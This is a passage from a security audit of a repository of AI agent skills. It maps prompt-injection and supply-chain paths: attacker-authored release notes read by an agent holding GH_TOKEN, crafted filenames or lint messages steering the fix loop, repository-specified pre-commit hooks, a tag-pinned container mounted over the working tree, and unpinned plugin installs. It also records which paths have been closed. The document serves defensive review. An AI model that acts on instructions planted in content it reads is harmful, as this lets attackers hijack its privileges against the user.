`references/agent-content.md:86`-`:96` restated from the reading side. This changes how a model
weighs what it reads. It does not create a boundary, and this path stays open.

**Partial mitigation, one skill only, as audited.** `ansible-verification-loop/SKILL.md:65`
overrides repo documentation for SSH, sudo, PAM, audit, SELinux, AppArmor, firewall, mounts,
sysctl and service tasks: "Regardless of what a repo's docs say". As audited, no equivalent
override existed in the other four skills that read the same files.

#### 3.2 Upstream release notes and tags

**Entry point.** An action repository whose release notes or tag names the consumer's agent is
about to read.

**File abused.** `skills/github/github-actions-security/SKILL.md:153`, which instructs confirming a
tag "against the repository's own release notes", and `:158`, which instructs reading release
notes for breaking changes.

**What the agent does.** It reads attacker-authored prose while holding `GH_TOKEN` (`:253`) and
while authorized to rewrite `uses:` references to SHAs (`:163`).

**Blast radius.** A `uses:` line pinned to an attacker's SHA, in a workflow the consumer merges
precisely because the skill said the pin was resolved from the source rather than recalled. The
skill's own `github-actions-security/references/supply-chain.md:35` already warns that a
reference which looks upstream
can resolve through the upstream object store; the skill does not extend that suspicion to the
release notes it tells the agent to read.

#### 3.3 Tool output as an instruction channel

**Entry point.** A crafted filename, a crafted ruleset description, a crafted lint message, or a
crafted container log line in the repository under review.

**File abused.** Every skill's Verify section, because every skill's bounded loop makes a control
decision from tool output: `github-repository-security/SKILL.md:122`-`:131` pipes `gh api` JSON
through `--jq` and back into the loop, `github-actions-security/SKILL.md:249` reads `zizmor`
output, `ansible-verification-loop/SKILL.md:136` reads `ansible-lint` output and `:163` reads a
detached `molecule` run's log.

**What the agent does.** It reads the output as findings to act on. Five of the eight skills tell
the agent to read command output as data rather than instruction in their discovery step; the
other three say nothing. Either way the line is a probabilistic mitigation, not a trust boundary:
it may steer the model but nothing stops crafted output from being read as an instruction, so the
path stays open.

**Blast radius.** Steering of the fix loop, at the privilege the skill implies. Lower yield than
3.1, and much harder to notice, because tool output is the one thing a reviewer of the session
scrolls past.

#### 3.4 `pre-commit run --all-files`

**Entry point.** A `.pre-commit-config.yaml` in the repository under review.

**File abused.** `skills/bash/bash-secure-scripting/SKILL.md:262`, which instructs running checks
"through the repository's own entry point where one exists", naming
`pre-commit run --all-files`.

**What the agent does.** It executes hook code the target repository specifies, fetched from
wherever that config points.

**Blast radius.** Code execution on the consumer's machine, requested by the skill, sourced
entirely from the repository under review. The instruction is right for reproducibility and wrong
for trust boundary, and the file does not distinguish the two cases.

#### 3.5 A container image mounted over the working tree

**Entry point.** Whoever controls the `rhysd/actionlint:1.7.12` tag.

**File abused.** `skills/github/github-actions-security/SKILL.md`, at the command that bind-mounts
`$PWD` read-write into a container that was pinned by **tag**. The same file said, a few lines
above, to pin the container by digest when it runs in CI, and this repository's own
`lint.yml:136` did exactly that.

**What the agent does.** Runs the image and mounts the consumer's working tree into it.

**Blast radius.** Read and write of the consumer's working tree by whatever the tag currently
resolves to.

**Landed.** The command at `skills/github/github-actions-security/SKILL.md:239`-`:241` now pins
`rhysd/actionlint` by the digest already carried at `lint.yml:136`, and `README.md:436` was changed
with it. The surrounding text at `:226`-`:230` states the reason at the command rather than as a
rule the command below it broke. This path is closed for actionlint. It is untouched for `uvx
"zizmor@1.29.0"` at `github-actions-security/SKILL.md:249`, which still resolves a package
name from an index at run time: a
version is not a hash.

### Actor 4: a consumer who tracks a moving ref rather than a pinned one

**Entry point.** The documented install. As audited, `README.md` gave
`/plugin marketplace add konstruktoid/agent-instructions-skills` with no ref as the first and only
form, and gave the update pair with no ref either.

**What the consumer gets.** An update fetches the current default branch. As audited, the team
setting offered `"ref": "<branch-or-tag>"` as the way to pin and stated that a marketplace source
"accepts a branch or tag, not a commit SHA". No tag existed in the repository, so the only
available pin was a branch, which is itself moving. The single mechanism that pinned an exact
commit was the submodule at `README.md:218`, presented as the route for the instructions documents
and for non-plugin setups rather than as the way to obtain skills.

**Landed on the repository side.** `README.md:148` now gives the pinned form first, with the
unpinned form kept below and labeled as tracking the default branch (`:158`). The team setting at
`:203` names a tag and states why a branch is not equivalent. Every plugin entry declares the same
`version`, and `scripts/check_skills.py:569` fails the build when one is missing, malformed, or
disagrees with the others. `README.md:559` documents the release order, and
`.github/rulesets/release-tags.json` holds the tag protection in the repository, which is what
`references/agent-content.md:125` and `references/rulesets.md:48` require.

**Landed, 2026-08-30.** The tag exists and the ruleset is applied, so `v0.1.0` in
`README.md:148` names a reference that resolves and that cannot be deleted or moved. Read back,
the ruleset blocks `deletion` and `non_fast_forward` on `refs/tags/v*` with no bypass actors. This
path is closed for a consumer who pins. It stays open for one who installs the unpinned
marketplace form, since that still tracks the default branch.

**Blast radius.** For a consumer on the unpinned form, whatever paths 1.3, 1.4, 2.3, or 3.5
planted, delivered at their next `/plugin update` with no version number to notice, no release
note to read, and no diff between what they had and what they now run. That exposure window is one
command, and the consumer closes it by pinning to `v0.1.0`, which the tag ruleset holds immutable.
A consumer who is already pinned takes nothing from these paths until they move the pin.

The consumer-side audit the repository itself specifies at `references/agent-content.md:129`
asks whether "releases are tagged rather than deployed from a moving branch". Run against this
repository today, that check passes, and what is left is the consumer who never pins.
